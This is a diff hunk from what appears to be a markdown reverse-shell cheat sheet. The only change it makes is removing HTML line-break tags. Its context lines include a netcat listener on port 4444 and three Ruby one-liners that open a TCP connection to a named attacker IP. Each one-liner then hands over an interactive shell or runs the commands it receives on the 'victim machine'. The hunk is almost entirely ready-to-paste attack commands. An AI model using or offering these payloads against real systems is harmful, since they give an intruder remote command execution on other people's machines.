@@ -15,17 +15,17 @@ Attacker is listining on port 4444 `nc -lvp 4444`. Now on victim machine run
 ```ruby
 ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
 ```
-</br>
+
 if you don't whant to rely on `/bin/sh`
 ```ruby
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-</br>
+
 if you don't whant to rely on `cmd.exe`
 ```ruby
 ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-</br>
+
 since `192.168.0.13` is the attacker IP
 
 If you what it as more flixable script file
